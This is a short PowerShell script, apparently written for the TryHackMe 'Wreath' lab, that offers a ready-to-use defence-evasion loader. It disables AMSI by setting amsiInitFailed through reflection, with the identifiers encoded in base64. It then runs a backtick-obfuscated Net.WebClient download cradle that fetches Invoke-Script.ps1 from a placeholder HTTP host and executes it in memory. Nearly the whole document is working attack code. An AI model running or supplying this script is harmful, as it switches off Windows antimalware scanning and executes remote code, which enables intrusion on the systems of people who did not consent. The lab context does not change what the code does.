#Execute your .ps1 shell via IEX, bypass AMSI & Windows Defender.
#Tested on updated W10 systems and was used to finish THM's Network "Wreath"
#Author: 0iphor13

Start-Sleep -s 3

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);

Start-Sleep -s 2

. ((${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}."`I`N`V`o`k`e`C`o`m`m`A`N`d"). "`N`e`w`S`c`R`i`p`T`B`l`o`c`k"((& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tp://0.0.0.0:8080/Invoke-Script.ps1')))

Start-Sleep -s 20

